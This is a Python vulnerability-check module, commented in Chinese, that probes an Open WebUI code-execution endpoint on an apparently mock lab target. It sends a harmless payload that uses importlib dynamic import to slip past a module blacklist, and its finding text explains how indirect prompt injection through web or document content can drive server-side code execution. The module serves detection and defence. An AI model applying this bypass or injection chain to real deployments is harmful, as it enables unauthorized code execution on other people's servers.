"""open-webui-indirect-injection-exec — Open WebUI 间接注入执行（零日级漏洞模块，已公开）。

检测流程：/__routes__ fingerprint → 以「间接注入语义」的良性载荷（动态导入形态 marker，无真实敏感动作）
经 /api/v1/utils/code/execute 提交 → 200 + stdout 即「护栏包装后仍可执行动态导入形态」；403 → 加固态零发现。
"""
from __future__ import annotations

import json
import urllib.error
import urllib.request

TARGET_SERVICE = "open-webui"
TARGET_PATH = "/api/v1/utils/code/execute"


def _request(method: str, url: str, body=None, headers=None, timeout: int = 15):
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if data is not None:
        req.add_header("Content-Type", "application/json")
    for key, value in (headers or {}).items():
        req.add_header(key, value)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw, status = resp.read(), resp.status
    except urllib.error.HTTPError as exc:
        raw, status = exc.read(), exc.code
    text = raw.decode("utf-8", "replace")
    try:
        payload = json.loads(text)
    except ValueError:
        payload = text
    return status, payload


def _fingerprint(base: str):
    status, manifest = _request("GET", base + "/__routes__")
    if status != 200 or not isinstance(manifest, dict):
        return None, "fingerprint 失败：目标无 /__routes__ 清单（非实验室 mock 语义），不进入动作分支"
    for route in manifest.get("routes", []):
        if route.get("service") == TARGET_SERVICE and route.get("path") == TARGET_PATH:
            return manifest, None
    return manifest, f"fingerprint 未命中：目标无 {TARGET_SERVICE} {TARGET_PATH} 路由"


def run(ctx: dict, params: dict) -> dict:
    base = str(params.get("base_url", "")).rstrip("/")
    if not base:
        raise ValueError("缺少 params.base_url（mock 靶场地址，仅限授权范围）")
    marker = str(params.get("marker") or ctx.get("marker") or "INKBLADE-zeroday")

    manifest, miss = _fingerprint(base)
    if miss is not None:
        return {"summary": miss, "findings": [], "artifacts": []}

    # 间接注入语义的良性载荷：护栏包装（代码块包装/黑名单）之后仍以动态导入形态到达解释器；
    # 仅导入标准库 os 并回显 marker，无任何破坏性或外传动作。
    code = (
        f"import importlib\n"
        f"print(importlib.import_module('os').getcwd())  # INKBLADE indirect-injection benign marker: {marker}"
    )
    status, payload = _request("POST", base + TARGET_PATH, body={"code": code})
    findings: list[dict] = []
    if status == 200 and isinstance(payload, dict) and payload.get("ok"):
        findings.append({
            "sev": "high",
            "title": "Open WebUI 间接注入执行：护栏包装后动态导入形态仍可执行",
            "detail": "间接提示注入（如网页/文档内容中的代码块）可驱动服务端代码解释器执行：护栏包装与模块黑名单可被动态导入形态绕过，"
                      "攻击者无需直接使用工具按钮即可触发服务端执行。",
            "evidence": json.dumps({
                "route": TARGET_PATH, "status": status, "stdout": payload.get("stdout"),
                "code_path": payload.get("code_path"), "mode": (manifest or {}).get("mode"),
                "payload_form": "indirect-injection dynamic-import marker", "marker": marker,
            }, ensure_ascii=False),
            "mapping": "零日登记册：智能体平台间接注入条目；与 open-webui-code-execute-rce 同端点不同攻击面（注入链 vs 直接工具链）",
            "fix": "间接内容（网页/文档）默认禁用代码解释器调用；护栏在解释器层而非包装层；动态导入列入运行时拦截",
            "is_zeroday": True,
        })
        summary = "fingerprint 命中 open-webui；护栏包装后间接注入执行成立（vulnerable 姿态）"
    else:
        summary = f"fingerprint 命中 open-webui；间接注入载荷被拒（status={status}，fixed/加固态）"
    return {"summary": summary, "findings": findings, "artifacts": []}
